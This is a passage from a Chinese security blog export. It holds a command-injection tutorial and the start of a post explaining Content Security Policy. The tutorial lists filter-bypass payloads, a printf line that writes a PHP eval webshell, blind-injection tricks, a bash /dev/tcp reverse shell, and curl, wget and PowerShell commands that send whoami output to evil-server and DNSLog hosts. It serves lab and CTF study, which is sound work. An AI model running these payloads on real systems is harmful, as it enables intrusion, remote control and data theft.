<p>return_var：如果提供 <code>return_var</code> 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>执行 <code>command</code> 参数所指定的命令。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">array</span> &amp;<span class="variable">$output</span> = ? , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>command：要执行的命令。</p>
<p>output：如果提供了 <code>output</code> 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 </p>
<p>return_var：如果同时提供 <code>output</code> 和 <code>return_var</code> 参数， 命令执行后的返回状态会被写入到此变量。</p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>执行 <code>command</code> 参数所指定的命令并且显示原始输出。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>command：要执行的命令。</p>
<p>return_var：如果提供 <code>return_var</code> 参数， Unix 命令的返回状态会被记录到此参数。</p>
<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec ( <span class="keyword">string</span> <span class="variable">$cmd</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>cmd：要执行的命令。</p>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">popen ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> ) : resource</span><br></pre></td></tr></table></figure>
<p>command：命令。</p>
<p>mode：模式。</p>
<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><p>执行一个命令，并且打开用来输入/输出的文件指针。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">proc_open ( <span class="keyword">string</span> <span class="variable">$cmd</span> , <span class="keyword">array</span> <span class="variable">$descriptorspec</span> , <span class="keyword">array</span> &amp;<span class="variable">$pipes</span> , <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span> , <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">null</span> , <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">null</span> ) : resource</span><br></pre></td></tr></table></figure>
<p>cmd：要执行的命令</p>
<p>descriptorspec：一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</p>
<p>pipes：将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</p>
<p>cwd：要执行命令的初始工作目录。 必须是 <em>绝对</em> 路径， 设置此参数为 <strong><code>null</code></strong> 表示使用默认值（当前 PHP 进程的工作目录）。</p>
<p>env：要执行的命令所使用的环境变量。 设置此参数为 <strong><code>null</code></strong> 表示使用和当前 PHP 进程相同的环境变量。</p>
<p>other_options：你还可以指定一些附加选项。 目前支持的选项包括：</p>
<ul>
<li><code>suppress_errors</code> （仅用于 Windows 平台）： 设置为 <strong><code>true</code></strong> 表示抑制本函数产生的错误。</li>
<li><code>bypass_shell</code> （仅用于 Windows 平台）： 设置为 <strong><code>true</code></strong> 表示绕过 <code>cmd.exe</code> shell。</li>
</ul>
<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>PHP 支持一个执行运算符：反引号(``)。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。效果和 shell_exec() 相同。</p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="system-1"><a href="#system-1" class="headerlink" title="system"></a>system</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system(command)</span><br></pre></td></tr></table></figure>
<p>在子 shell 中执行命令（字符串）。在 Unix 上，返回值是进程的退出状态；在 Windows 上，返回值是运行 <em>command</em> 后系统 Shell 返回的值。</p>
<h4 id="popen-1"><a href="#popen-1" class="headerlink" title="popen"></a>popen</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">popen(cmd, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>打开一个管道，它通往 / 接受自命令 <em>cmd</em>。返回值是连接到管道的文件对象，根据 <em>mode</em> 是 <code>&#39;r&#39;</code> （默认）还是 <code>&#39;w&#39;</code> 决定该对象可以读取还是写入。</p>
<h4 id="subprocess-call-subprocess-run"><a href="#subprocess-call-subprocess-run" class="headerlink" title="subprocess.call/subprocess.run"></a>subprocess.call/subprocess.run</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">subprocess.call(args, *, stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, **other_popen_kwargs)</span><br></pre></td></tr></table></figure>
<p>运行由 <em>args</em> 所描述的命令。 等待命令完成，然后返回 <code>returncode</code>属性。</p>
<h4 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h4><p>创建新进程以执行命令</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="java-lang-Runtime-getRuntime-exec-command"><a href="#java-lang-Runtime-getRuntime-exec-command" class="headerlink" title="java.lang.Runtime.getRuntime().exec(command)"></a>java.lang.Runtime.getRuntime().exec(command)</h4><h2 id="Linux下常用的符号"><a href="#Linux下常用的符号" class="headerlink" title="Linux下常用的符号"></a>Linux下常用的符号</h2><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>A;B</td>
<td>A不论正确与否都会执行B命令</td>
</tr>
<tr>
<td>A&amp;B</td>
<td>A后台运行，A和B同时执行</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>A执行成功的时候才会执行B命令</td>
</tr>
<tr>
<td>A|B</td>
<td>A执行的输出结果，作为B命令的参数，A不论正确与否都会执行B命令</td>
</tr>
<tr>
<td>A||B</td>
<td>A执行失败后才会执行B命令</td>
</tr>
<tr>
<td>()</td>
<td>群指令组，用括号将一串连续指令括起来，执行的效果等同于多个独立的命令单独执行的效果。</td>
</tr>
<tr>
<td>(())</td>
<td>用于算数运算’，与 let 指令相似</td>
</tr>
<tr>
<td>{}</td>
<td>拼接字符用法，{xx,yy,zz…}{aa,bb,cc…}得到xxaa,xxbb,xxcc,yyaa,yybb,yycc,zzaa,zzbb,zzcc…</td>
</tr>
<tr>
<td>[]</td>
<td>在流程控制中扮演判断式的作用；在正则表达式中担任类似 “范围” 或 “集合” 的角色。</td>
</tr>
<tr>
<td>[[ ]]</td>
<td>这组符号与先前的<code>[]</code> 符号，基本上作用相同，但她允许在其中直接使用`</td>
</tr>
</tbody></table>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">匹配任意长度任意字符</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">匹配任意单个字符</td>
</tr>
<tr>
<td align="left">[list]</td>
<td align="left">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td align="left">[^list]</td>
<td align="left">匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td align="left">[!list]</td>
<td align="left">同<code>[^list]</code></td>
</tr>
<tr>
<td align="left">{str1,str2,…}</td>
<td align="left">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
</tr>
<tr>
<td align="left">IFS</td>
<td align="left">由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
</tr>
<tr>
<td align="left">CR</td>
<td align="left">由 &lt; enter &gt; 产生</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">执行 history 中的命令</td>
</tr>
</tbody></table>
<h2 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h2><h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><ul>
<li>在Unix上:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a</span><br><span class="line">%0d </span><br><span class="line">;</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">$(shell_command)</span><br><span class="line">&#96;shell_command&#96;</span><br><span class="line">&#123;shell_command,&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在Windows上：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">%1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span><br></pre></td></tr></table></figure>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul>
<li>使用<code>&lt;</code>或者<code>&lt;&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>IFS</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat$IFS<span class="variable">$9</span>/flag</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>/flag</span><br><span class="line">cat<span class="variable">$IFS</span>/flag</span><br></pre></td></tr></table></figure>
<ul>
<li><p>​    在<code>url</code>的编码绕过</p>
</li>
<li><p>花括号拓展<code>&#123;OS_COMMAND,ARGUMENT&#125;</code></p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat,/etc/passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>变量控制</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">X=$&#x27;cat\x20/flag&#x27;&amp;&amp;$X</span><br><span class="line">X=$&#x27;cat\x09/flag&#x27;&amp;&amp;$X</span><br></pre></td></tr></table></figure>
<h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a>绕过 escapeshellcmd</h3><ul>
<li>win下执行bat</li>
</ul>
<p>win下执行.bat文件的时候，利用%1a，可以绕过过滤执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;..&#x2F; %1a whoami</span><br></pre></td></tr></table></figure>
<ul>
<li>宽字节注入</li>
</ul>
<p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="string">&quot;echo &quot;</span>.chr(<span class="number">0xc0</span>).<span class="string">&quot;;id&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>之后该语句会变成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> 繺;id</span><br></pre></td></tr></table></figure>
<p>从而实现 id 命令的注入。</p>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><blockquote>
<p>PHP表示字符串方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;foo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">string</span>)<span class="string">&quot;bar&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">string</span>)hello;</span><br><span class="line"><span class="keyword">echo</span> (world);</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>拼接</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br><span class="line">(sy.(st).em)(whoami)</span><br></pre></td></tr></table></figure>
<ul>
<li>利用已存在的资源</li>
</ul>
<p>从已有的文件或者环境变量中获得相应的字符。</p>
<ul>
<li>编码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash</span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
<ul>
<li>单引号、双引号</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c<span class="string">&quot;&quot;</span>at fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line">c<span class="string">&#x27;a&#x27;</span>t f<span class="string">&#x27;l&#x27;</span>ag</span><br></pre></td></tr></table></figure>
<ul>
<li>反斜线<code> \</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
<ul>
<li>通配符</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?<span class="keyword">in</span>/?s =&gt; ls</span><br><span class="line">cat fl[0-z]g</span><br><span class="line"><span class="built_in">echo</span> d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog</span><br><span class="line"><span class="built_in">echo</span> &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag</span><br><span class="line"><span class="built_in">echo</span> fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg</span><br></pre></td></tr></table></figure>
<ul>
<li>未定义变量</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat<span class="variable">$x</span> /etc/passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>可变函数</li>
</ul>
<p>获取内置函数 system 的索引后，直接执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.先获取system函数的索引</span></span><br><span class="line">php -r <span class="string">&#x27;get_defined_functions();&#x27;</span> | grep <span class="string">&#x27;system&#x27;</span></span><br><span class="line"><span class="comment">#2.直接使用system函数执行</span></span><br><span class="line">php -r get_defined_functions()[501](whoami)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>$@</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c<span class="variable">$@at</span> fl<span class="variable">$@ag</span></span><br><span class="line"><span class="built_in">echo</span> i<span class="variable">$@d</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用已经存在的资源</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>| cut -c 1</span><br><span class="line">/</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>| cut -c 1-4</span><br><span class="line">/usr</span><br></pre></td></tr></table></figure>
<ul>
<li>字符数组</li>
</ul>
<p>在 php 中可以用数组的形式取到字符串的每一个字符，这样我们就可以先定义一个包含所有需要的字符的字符串，然后通过下标取到字符再拼接的方式构造出我们需要的字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 相当于执行(system)(ls /tmp)</span></span><br><span class="line">php -r <span class="string">&#x27;$a=&quot;elmsty/ &quot;;($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp)&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用一些已有字符<ul>
<li>${PS2} 对应字符 <code>&gt;</code></li>
<li>${PS4} 对应字符 <code>+</code></li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>
</li>
</ul>
<h3 id="字符数限制绕过"><a href="#字符数限制绕过" class="headerlink" title="字符数限制绕过"></a>字符数限制绕过</h3><p>使用输出重定向<code>&gt;</code>分步把要执行的命令输入到一个文件中，然后再通过<code>sh</code>执行这个文件</p>
<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><h5 id="短命令执行"><a href="#短命令执行" class="headerlink" title="短命令执行"></a>短命令执行</h5><p>首先按照前面的<code>&gt;</code>的用法，我们可以知道有标准输出可以输出到文件</p>
<ol>
<li>只用<code>\</code>分行输入，这个优点是可以不用考虑时间顺序，直接用<code>ls&gt;a</code>输出到<code>a</code>文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># &gt;ec\</span></span><br><span class="line">&gt; ho\</span><br><span class="line">&gt; \ 1</span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls &gt;a</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat a</span></span><br><span class="line">a</span><br><span class="line"><span class="built_in">echo</span> 1</span><br><span class="line">root@kali:~/Desktop<span class="comment"># sh a</span></span><br><span class="line">a: 1: a: not found</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>这里把<code>echo 1</code>作为字符串输出到桌面，再使用<code>ls</code>命令将桌面的内容储存到<code>a</code>文件中，再执行<code>a</code>文件的内容，输出<code>1</code>。</p>
<ol start="2">
<li>使用<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来转义后一个<code>\</code>的。这里需要考虑时间顺序，需要逆序来创建文件。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># &gt;\ 1\\</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># &gt;ho\\</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># &gt;ec\\</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls -t&gt;a</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat a</span></span><br><span class="line">a</span><br><span class="line">ec\</span><br><span class="line">ho\</span><br><span class="line"> 1\</span><br><span class="line">root@kali:~/Desktop<span class="comment"># sh a</span></span><br><span class="line">a: 1: a: not found</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<ul>
<li>-t 将文件依建立时间之先后次序列出</li>
</ul>
<h2 id="无回显的命令注入"><a href="#无回显的命令注入" class="headerlink" title="无回显的命令注入"></a>无回显的命令注入</h2><p>我们之前提到的大部分都是有回显或者一部分提示的命令注入，当我们遇到无回显的命令注入的时候我们又要怎么办呢？</p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><ul>
<li>首先我们可以通过<code>sleep</code>命令根据返回的时间来判断是否存在命令执行漏洞。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;sleep 5</span><br></pre></td></tr></table></figure>
<p>若存在命令执行则会等待5秒才返回响应。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210329114110956.png" alt="image-20210329114110956"></p>
<ul>
<li>使用sleep来进行盲注</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sleep $(hostname | cut -c 1 |tr a 5)</span><br></pre></td></tr></table></figure>
<ol>
<li><p>我们执行的命令为hostname。我们假设它返回hacker。</p>
</li>
<li><p>它需要输出并将其传递给cut -c 1。这将选取hacker的第一个字符h。</p>
</li>
<li><p>接着通过tr命令将字符a替换为5。</p>
</li>
<li><p>然后将tr命令的输出传递给sleep命令，sleep h被执行将会立即出现报错，这是因为sleep后跟的参数只能为一个数字。然后，目标使用tr命令迭代字符。执行<code>sleep $(hostname | cut -c 1 | tr h 5)</code>命令，将需要5秒钟的时间。</p>
</li>
</ol>
<p>这样我们就可以确定第一个字符是一个h。以此类推，我们就能将完整的主机名猜解出来。</p>
<h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>无回显得命令执行语句可以使用DNSLog来查看结果。</p>
<ul>
<li>window</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %USERNAME%.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113629877.png" alt="image-20210317113629877"></p>
<ul>
<li>*nix</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 1 &#96;whoami&#96;.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113750098.png" alt="image-20210317113750098"></p>
<p>都可以看到我们的用户名显示在域名的最左边</p>
<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>首先在自己的机器上开启监听端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
<p>然后在命令执行处输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp;/dev/tcp/ip地址/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>可以得到靶机的bash控制权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.91.143: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.143] 34728</span><br><span class="line">root@ubuntu18:/var/www/html<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">checksite</span><br><span class="line">DVWA-master</span><br><span class="line">index.html</span><br><span class="line">phpmyadmin</span><br><span class="line">test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h3 id="HTTP外带"><a href="#HTTP外带" class="headerlink" title="HTTP外带"></a>HTTP外带</h3><ul>
<li>Linux</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://evil-server/$(whoami)</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324203716523.png" alt="image-20210324203716523"></p>
<ul>
<li>Window</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:</span><br><span class="line">for &#x2F;F %x in (&#39;whoami&#39;) do start http:&#x2F;&#x2F;xxx.ceye.io&#x2F;%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for &#x2F;F &quot;delims&#x3D;&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for &#x2F;F &quot;delims&#x3D; tokens&#x3D;2&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for &#x2F;F %x in (&#39;whoami&#39;) do powershell $a&#x3D;[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&#39;%x&#39;));$b&#x3D;New-Object System.Net.WebClient;$b.DownloadString(&#39;http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#39;+$a);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324205124046.png" alt="image-20210324205124046"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324205511286.png" alt="image-20210324205511286"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://myt0.com/2019/03/03/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF-Filter%E7%BB%95%E8%BF%87/" >PHP命令执行时的WAF&amp;Filter绕过方法<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >巧用命令注入的N种方式<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>命令注入/执行</tag>
      </tags>
  </entry>
  <entry>
    <title>CSP策略与绕过</title>
    <url>/2021/03/24/CSP%E7%AD%96%E7%95%A5%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="CSP策略与绕过"><a href="#CSP策略与绕过" class="headerlink" title="CSP策略与绕过"></a>CSP策略与绕过</h1><p>之前在同源策略中提到过CSP，也就是内容安全策略。CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。合理地配置好CSP能够避免绝大部分的XSS攻击。</p>
<h2 id="CSP的引入方式"><a href="#CSP的引入方式" class="headerlink" title="CSP的引入方式"></a>CSP的引入方式</h2><p>有两种方式启用CSP：</p>
<ol>
<li>通过HTTP头部得<code>Content-Security-Policy</code>字段</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object</span>-src <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>通过HTML标签<code>&lt;meta&gt;</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>


<h2 id="CSP常用指令"><a href="#CSP常用指令" class="headerlink" title="CSP常用指令"></a>CSP常用指令</h2><p>CSP会限制以下资源的加载：</p>
<ul>
<li><strong>child-src</strong>：指定定义了 web workers 以及嵌套的浏览上下文（如<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>）的源</li>
<li><strong>connect-src</strong>：限制能通过脚本接口加载的URL。</li>
<li><strong>font-src</strong> ：定义了字体加载的有效来源</li>
<li><strong>img-src</strong> ：定义了图片或者图标加载的有效来源</li>
<li><strong>media-src</strong>： 定义了媒体文件加载的有效来源如HTML6的 <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>等元素</li>
<li><strong>object-src</strong>：限制<code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>或者<code>&lt;applet&gt;</code>标签的源地址。</li>
<li><strong>style-src</strong> ：定义页面中CSS样式的有效来源</li>
<li><strong>script-src</strong> ：定义页面中javascript有效来源</li>
<li><strong>worker-src</strong>：限制Worker、SharedWorker或者ServiceWorker脚本源。</li>
<li><strong>manifest-src</strong>： 限制应用声明文件的源地址。</li>
<li><strong>frame-src：</strong> 设置允许通过类似<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>标签加载的内嵌内容的源地址。</li>
<li><strong>default-src</strong>：定义了那些没有被更精确指令指定的安全策略。</li>
</ul>
<blockquote>
<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
</blockquote>
<h2 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a>选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
</ul>
<p>多个值也可以并列，用空格分隔。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span> https:<span class="comment">//apis.google.com</span></span><br></pre></td></tr></table></figure>
<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
